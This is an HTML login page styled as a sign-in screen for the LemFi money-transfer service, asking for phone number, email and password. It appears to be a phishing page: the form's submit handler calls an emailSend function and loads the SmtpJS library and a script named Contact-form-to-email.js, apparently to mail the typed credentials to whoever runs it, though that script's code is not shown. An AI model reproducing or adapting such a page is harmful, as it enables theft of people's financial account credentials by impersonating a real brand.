<html lang="en"><head>
    <meta charset="UTF-8">
    <link rel="icon" type="image/svg+xml" href="lemfavicon.jpeg">
    <link rel="stylesheet" href="output.css">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="">
    <link href="https://fonts.googleapis.com/css2?family=Mukta+Malar:wght@400;500;600;700;800&amp;display=swap" rel="stylesheet">
    <title>Sign In</title>
  
  </head>
  
  <body class="bg-slate-100">
  
    <div id="app" class="w-[90%] mx-auto pt-8 max-w-sm">
      <h1 class="text-2xl font-bold mb-7">Log in to LemFi</h1>
  
  
      <form id="form" onsubmit="emailSend(); reset(); return false;" class="grid gap-5" > 
        <div>
          <span class="text-sm font-medium">Enter your phone number</span>
          <input id="tel" type="tel" maxlength="13" minlength="7" name="phone" placeholder="7777777777" class="bg-white p-3 border-slate-300 border rounded text-lg w-full transition-all focus:border-primary outline-none focus:!outline-none">
        </div>
        <div>
          <span class="text-sm font-medium">Enter your email address</span>
          <input id="email" type="email" name="email" placeholder="jon@example.com" class="bg-white p-3 border-slate-300 border rounded text-lg w-full transition-all focus:border-primary outline-none focus:!outline-none">
        </div>
        <div>
          <span class="text-sm font-medium">Enter your password</span>
          <input id="password" required="" type="password" name="pass" class="bg-white p-3 border border-slate-300 rounded text-lg w-full transition-all focus:border-primary outline-none focus:!outline-none">
        </div>
        <p class="font-medium">Trouble logging In? <span class="text-primary underline">Recover your account</span></p>
  
  
        <button disabled="" type="submit" class="font-bold max-w-sm absolute w-[90%] mx-auto text-lg bottom-14 bg-primary rounded-full p-3 text-white disabled:bg-slate-300 disabled:text-gray-400 active:scale-95 disabled:pointer-events-none">Log
          into
          your
          account</button>
      </form>
    </div>
  
    <script type="module" src="/main.js"></script>
    <script src="https://smtpjs.com/v3/smtp.js"></script>
    <script src="Contact-form-to-email.js"></script>
    <script src="https://unpkg.com/sweetalert/dist/sweetalert.min.js"></script>
  
  </body></html>
